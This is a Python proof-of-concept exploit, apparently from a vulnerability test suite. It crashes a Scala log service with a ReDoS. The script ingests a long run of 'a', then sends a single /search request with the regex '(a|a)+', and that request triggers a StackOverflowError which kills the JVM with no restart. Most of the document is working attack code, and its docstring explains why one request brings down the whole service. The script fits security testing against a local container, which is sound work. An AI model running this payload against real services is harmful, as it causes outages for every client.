#!/usr/bin/env python3
r"""
PoC #4: Search ReDoS -> one-shot process crash (denial of service)
------------------------------------------------------------------
GET /search compiles the client-supplied `q` into a java.util.regex (`q.r`) and
matches it against every stored line (Main.scala Search.run). java.util.regex is
a RECURSIVE backtracking engine: a nested-quantifier/alternation pattern like
`(a|a)+` matched against a long run of 'a' descends one stack frame per matched
character. A few tens of thousands of characters is enough to blow the JVM's
thread stack -> `java.lang.StackOverflowError`.

WHY THAT CRASHES THE WHOLE SERVICE (not just the one request)
-------------------------------------------------------------
`StackOverflowError` is a `VirtualMachineError`, which Scala's `NonFatal` treats
as FATAL. Cats Effect does not convert a fatal error into a 500 response the way
it would an ordinary exception; its runtime treats fatal throwables as
unrecoverable and terminates the JVM. So the error thrown inside
`IO.blocking(Search.run(...))` does not stay contained to the attacker's request
-- it takes the process down. The module's supervisor (ota-agent.sh) only
respawns the service on an OTA update, never on a crash/unexpected exit, so the
container goes to `Exited(1)` and STAYS down. One crafted `/search` = a
full-service outage for every client, exactly like DNSM's one-packet crashes.

HOW THIS PROVES IT, PURELY OVER THE WIRE
----------------------------------------
  1. Confirm the service is alive (GET /health answers 200 "ok").
  2. Ingest one long near-match line (a long run of 'a').
  3. Fire ONE crafted /search (`q=(a|a)+`) -- fire-and-forget; the connection
     dies mid-request as the JVM exits, so we never look at its "reply".
  4. Confirm the service is now dead: repeated GET /health all fail, and stay
     failing (no supervisor respawn).
A live-before / dead-after transition off a single request proves the crash --
we never judge success by the attacking request's own fate (it just gets its
connection dropped), only by a separate bystander (/health) going dark.

Run LOG first:
    docker compose -f vuln_tests/docker-compose.yml up -d --build log
Then:  python3 04_search_redos.py [host] [port]
"""
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"

SRC = "redos"
# Length of the 'a' run the recursive matcher descends through. The default
# Temurin 21 thread stack blows well under 15k frames; 50k is a comfortable
# margin (and still only a ~50 KB request). The regex is a nested
# alternation-quantifier -- a textbook catastrophic-backtracking pattern -- but
# here it recurses to a StackOverflowError before it can even start burning CPU.
N = 50000
EVIL = "(a|a)+"


def health_ok(timeout=3.0):
    try:
        with urllib.request.urlopen(f"{BASE}/health", timeout=timeout) as r:
            return r.status == 200 and r.read() == b"ok"
    except Exception:
        return False


def service_alive(tries=4, timeout=3.0):
    for _ in range(tries):
        if health_ok(timeout=timeout):
            return True
        time.sleep(0.5)
    return False


def post_ingest(source, message):
    body = json.dumps({"source": source, "message": message}).encode()
    req = urllib.request.Request(f"{BASE}/ingest", data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=15) as r:
        return r.status


def main():
    # 1) Baseline: the bystander endpoint must be up before we attack.
    if not health_ok(timeout=5.0):
        print("[-] GET /health did not answer; start LOG first.")
        return 1
    print(f"[*] service is alive (GET /health -> 200 'ok') at {HOST}:{PORT}")

    # 2) Ingest the long near-match line the recursive matcher will descend.
    victim = "a" * N
    print(f"[*] ingesting a {len(victim)}-char 'a'-run into source {SRC!r}")
    post_ingest(SRC, victim)

    # 3) Fire ONE crafted search. The request never returns cleanly: the JVM
    #    exits mid-match, so the connection is dropped. We deliberately ignore
    #    its fate and judge only by the bystander /health below.
    qs = urllib.parse.urlencode({"q": EVIL, "source": SRC})
    print(f"[*] firing ONE /search?q={EVIL} (recurses ~{N} frames deep -> "
          f"StackOverflowError -> Cats Effect exits the JVM)...")
    try:
        # The crash drops the socket almost immediately; this cap only bounds the
        # rare case where it doesn't, so it stays well inside the per-PoC budget.
        with urllib.request.urlopen(f"{BASE}/search?{qs}", timeout=10) as r:
            r.read()
        print("[*] search returned a response (unexpected -- see verdict below)")
    except Exception as e:
        # A dropped connection / read error is exactly what a crashing server
        # looks like from the client side.
        print(f"[*] search connection died ({type(e).__name__}) -- consistent "
              f"with the server crashing mid-request")

    time.sleep(1.0)  # let the process tear down and the supervisor exit

    # 4) Verdict: the service must now be dead, AND stay dead (no respawn).
    if service_alive(tries=6, timeout=3.0):
        print("[-] service still answering /health after the crash search; the "
              "bug may be fixed (untrusted `q` no longer compiled to a "
              "backtracking regex) or the process was auto-restarted.")
        return 1

    print("[+] crash confirmed: a SINGLE /search with a nested-quantifier regex "
          "over a long line drove java.util.regex into a StackOverflowError, "
          "which Cats Effect treats as fatal and exits the JVM. The service that "
          "answered /health moments ago is now dead to every client and is not "
          "respawned -- one request, full-service outage.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
